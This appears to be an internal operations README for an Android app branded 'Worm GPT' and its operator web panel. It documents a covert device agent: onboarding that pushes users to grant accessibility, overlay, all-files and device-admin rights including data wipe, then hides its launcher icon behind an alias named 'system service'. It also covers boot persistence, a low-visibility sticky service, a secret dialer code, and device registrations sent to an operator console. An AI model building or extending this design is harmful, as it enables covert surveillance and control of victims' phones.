# OPS

## Android

### Flow
1. Launch (via `LauncherBoost` alias, red, "Worm GPT") -> intro bubbles "أهلاً بيك" / "هناخد دقيقة واحدة بس" with typing dots.
2. Name: 2..40 chars, Next disabled until valid.
3. Checklist rows, each opens its own intent: overlay, accessibility (real `WormA11yService`, gate reads `Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES`), all-files, battery-opt, device-admin, notifications. Re-checked on every `ON_RESUME`. Next blocked until overlay + accessibility + battery-opt + device-admin are green.
4. Phone: strict E.164 (`^\+[1-9]\d{9,14}$`), +20 prepended for local numbers.
5. Summary + "قفل": `RegistrationApi.register` -> outbox JSONL (kotlinx.serialization, fingerprint + constraints included), registration persisted, then `finishAffinity()`. **قفل لا يخفي شيئًا.**
6. Next launch with `pendingHide` set (DataStore): black veil 2000ms -> `WormSvc` -> `LauncherBoost` disabled / `LauncherHidden` ("خدمة النظام") enabled with `DONT_KILL_APP` -> flag cleared -> finish.

### Components
| Component | Notes |
|-----------|-------|
| `WormA11yService` | BIND_ACCESSIBILITY_SERVICE, `res/xml/a11y_config.xml` (canRetrieveWindowContent, canPerformGestures, typeAllMask, feedbackGeneric, timeout 100) |
| `WormSvc` | foregroundServiceType=specialUse, `PROPERTY_SPECIAL_USE_FGS_SUBTYPE=device agent`, `START_STICKY`, channel `IMPORTANCE_MIN`; writes `filesDir/agent/health.json` `{state, startedAt, lastBeat}` on start and every 60s |
| `BootRcv` | BOOT_COMPLETED + LOCKED_BOOT_COMPLETED + MY_PACKAGE_REPLACED; swallows `ForegroundServiceStartNotAllowedException` |
| `SecretRcv` | dial `*#*#2468#*#*` -> `StatusActivity` (alias state, health-from-disk incl. stale detection, phone) |
| `AdminRcv` | `DeviceAdminReceiver`, policies wipe-data + force-lock in `res/xml/device_admin.xml` |

### Debug
- Secrets: health age shows at `*#*#2468#*#*`; stale (>2 missed beats) renders "قديمة".
- Registrations outbox: `adb shell run-as com.wormgitty.agent cat files/registrations/queue.jsonl`
- Health snapshot: `adb shell run-as com.wormgitty.agent cat files/agent/health.json`
- Alias state: `adb shell pm list packages -e | grep wormgitty` or the status screen.

## Panel

### Token handling
- Access token: memory only (`src/lib/api.js`).
- Refresh token: `localStorage["refresh_token"]`.
- On 401: exactly one `/api/auth/refresh` + retry of the original call; if refresh dies, purge and redirect `#/login`.
- 429: cooldown banner, 30s countdown then auto reload. 500: retry button. Network down: offline banner.

### Mocks
- MSW worker starts only when `VITE_USE_MOCK=true` (set in `.env.development`); production builds ship no worker.
- Fixtures: `panel/mocks/fixtures/index.js` (3 devices, operator `ops@wormgitty.local` / `w0rm-gitty-pass`).
- Auth-enforced mocks: admin endpoints demand `Authorization: Bearer`; 5 failed logins trigger 429 cooldown.
- Fault injection for tests: `window.__wg_fault` (`auth401Left`, `refreshFail`); request log: `window.__wg_captured`.

## Gate

`scripts/gate.sh` runs, in order:
```
android: ./gradlew test lint connectedDebugAndroidTest
panel:   npm ci && npm test && npx playwright test
```
Any failure exits non-zero.

## CI

Actions disabled (monthly quota exhausted on a private repo). Gate is `scripts/gate.sh`, local only.
